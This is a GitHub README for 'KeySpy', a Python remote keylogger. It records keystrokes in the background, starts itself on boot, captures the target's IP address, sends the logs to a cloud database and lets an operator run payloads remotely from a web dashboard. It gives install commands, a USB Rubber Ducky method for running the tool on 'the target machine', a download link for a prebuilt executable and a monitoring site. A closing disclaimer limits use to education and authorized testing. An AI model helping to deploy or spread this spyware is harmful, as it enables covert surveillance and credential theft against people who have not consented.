<p align="center"><a href="https://github.com/3rr0r-505/KeySpy"><img alt="" src="https://github.com/3rr0r-505/KeySpy/blob/main/img/KeySpy-cover.png?raw=true"  height="50%" width="100%"/></a></p>

<p align="center"> 
<a href="https://www.python.org/"><img alt="" src="https://img.shields.io/badge/python-3.9%2B-blue?logo=python&logoColor=88d4d7"/></a>
&nbsp;
<a href="https://flask.palletsprojects.com/en/3.0.x/"><img alt="" src="https://img.shields.io/badge/Flask-v3.0.3-45aec2?logo=flask&logoColor=45aec2"/></a>
&nbsp;
<!--<a href="https://nodejs.org/en"><img alt="" src="https://img.shields.io/badge/Node.js-v16.4.0-339933?logo=node.js"/></a>
&nbsp;-->
<a href="https://www.mongodb.com/"><img alt="" src="https://img.shields.io/badge/MongoDB%20Atlas-v4.4.6-009441?logo=mongodb&logoColor=009441"/></a>
&nbsp;
<a href="https://vercel.com"><img alt="" src="https://img.shields.io/badge/Deployed%20with-Vercel-black?logo=vercel"/></a>
&nbsp;
<a href="https://www.microsoft.com/en-us/windows?r=1"><img alt="" src="https://img.shields.io/badge/OS-Windows-brighten?logo=windows&logoColor=blue&label=OS&labelColor=grey&color=blue"/></a><br>
</p>

# KeySpy - Remote Keylogger Tool

KeySpy is a Python keylogger with a web interface for viewing captured keystrokes and executing payloads remotely in real-time.

## Features

- Captures keystrokes in the background while running.
- Stores captured keystrokes in `mongoDB Atlas`.
- Displays captured keystrokes in a web interface.
- Excute Payloads remotely from the web interface.
- Auto-Start on System boot.
- Capture IPv4 address of the target device.
- Allows viewing keystrokes from multiple sessions.

## D3V-Installation
 
1. Clone the repository:
   ```bash
   git clone https://github.com/3rr0r-505/KeySpy.git

2. Navigate to the project directory:
   ```bash
   cd KeySpy

3. Install the required dependencies using pip:
   ```bash
   pip install -r requirements.txt

## Usage
   ### 🦆Rubber Ducky
   - Download the DuckyScript.txt and load that in USB Rubber Ducky.
   - Connect the USB Rubber Ducky to the target machine.
   - It will run KeySpy on that machine.
     
   <!--### 🕸️Web Extension:
   - Download the extension zip file [extn.zip](https://github.com/3rr0r-505/WebSpy/releases/download/v1.0/extn.zip) and extract the zip file.
   - Open the Browser.
   - Search this link `chrome://extensions/`.
   - Click on `Load Unpack`.
   - Add .extn folder. `[For more info, visit]` [WebSpy](https://github.com/3rr0r-505/WebSpy).-->
    
   ### 🌐Web Interface:
   - Visit this site [w3blogger.vercel.app](https://w3blogger.vercel.app/) to monitor the keylogs and execute payloads remotely
   
## Note
- For Downloading the `kSpy-AIO.exe` file [click here](https://github.com/3rr0r-505/KeySpy/releases/download/v1.5/kSpy-AIO_v1.5.exe) or visit the releases page.
<!--
- Create a `mongoDB Atlas` cluster and use the connection links. 
- Soon the extension will be available on the chrome store.-->
 `⚠️ It's a Experimental project inspired by Hak5 OMG & still in development.`

## Contributing

Contributions are welcome! Feel free to open issues or pull requests for any improvements or bug fixes.

## Legal Disclaimer
The use of code contained in this repository, either in part or in its totality,
for engaging targets without prior mutual consent is illegal. **It is
the end user's responsibility to obey all applicable local, state and
federal laws.**

Developers assume **no liability** and are not
responsible for misuses or damages caused by any code contained
in this repository in any event that, accidentally or otherwise, it comes to
be utilized by a threat agent or unauthorized entity as a means to compromise
the security, privacy, confidentiality, integrity, and/or availability of
systems and their associated resources. In this context the term "compromise" is
henceforth understood as the leverage of exploitation of known or unknown vulnerabilities
present in said systems, including, but not limited to, the implementation of
security controls, human- or electronically-enabled.

The use of this code is **only** endorsed by the developers in those
circumstances directly related to **educational environments** or
**authorized penetration testing engagements** whose declared purpose is that
of finding and mitigating vulnerabilities in systems, limiting their exposure
to compromises and exploits employed by malicious agents as defined in their
respective threat models.

## License
This project is licensed under the MIT License 2.0 - see the [LICENSE](https://github.com/3rr0r-505/KeySpy/blob/main/LICENSE) file for details.
